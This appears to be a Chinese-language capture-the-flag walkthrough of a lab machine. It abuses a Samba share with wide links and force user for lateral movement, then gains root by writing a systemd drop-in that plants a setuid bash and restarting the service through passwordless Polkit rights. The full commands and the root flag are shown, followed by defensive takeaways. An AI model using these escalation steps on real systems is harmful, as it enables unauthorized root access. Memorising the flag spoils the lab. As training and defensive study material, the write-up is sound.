Phase 3

横向移动二：Samba Wide Links → marcus

[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   wide links = yes
[global]
   unix extensions = no
   allow insecure wide links = yes
🧒 儿童版 — 符号链接 + 变身魔法你用 scott 登录，但所有文件操作都"变身"成 marcus。wide links = yes 允许符号链接跳出共享目录——创建一个指向 / 的快捷方式，就能以 marcus 身份读写整个文件系统。
scott@abducted:$ cd /srv/transfer && ln -s / rootfs

$ smbclient //10.129.244.177/transfer -U scott

$ chmod 700 /srv/transfer/rootfs/home/marcus/.ssh

Phase 4

权限提升：Systemd Drop-in + Polkit 免密重启

$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d  (drwxrws--- root operators)
Polkit 规则operators 组被授予 org.freedesktop.systemd1.reload-daemon 和 manage-units(smbd.service) 的 YES 权限——无需密码即可 daemon-reload + 重启 smbd。
🧒 儿童版 — 补丁文件夹 + 免密重启Systemd 的 drop-in 目录就像服务的"补丁文件夹"——往里面放配置，服务启动时自动加载。我们写了一个"补丁"说"启动前先给我做个 root 后门"。Polkit 允许无密码重启——两个漏洞合在一起就是 root。
$ cat << 'EOF' > /etc/systemd/system/smbd.service.d/override.conf
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/rootbash
ExecStartPre=/bin/chmod +xs /tmp/rootbash
EOF

$ systemctl daemon-reload
$ systemctl restart smbd

$ /tmp/rootbash -p
rootbash-5.2# cat /root/root.txt
5ea812670b70c8aed4ee1af7114af226

知识点总结

rclone reveal：可逆加密等于没加密。

找到 rclone.conf 就等于找到明文密码。

Samba wide links + force user = 任意文件读写。

符号链接跳出共享目录，配合 force user 以目标用户身份操作。

Systemd drop-in 目录可写 = root 命令执行。

ExecStartPre 在服务启动前以 root 身份执行。

审计 Polkit 规则。

检查 /etc/polkit-1/rules.d/，看哪些组有无需认证的 daemon-reload 或 manage-units。
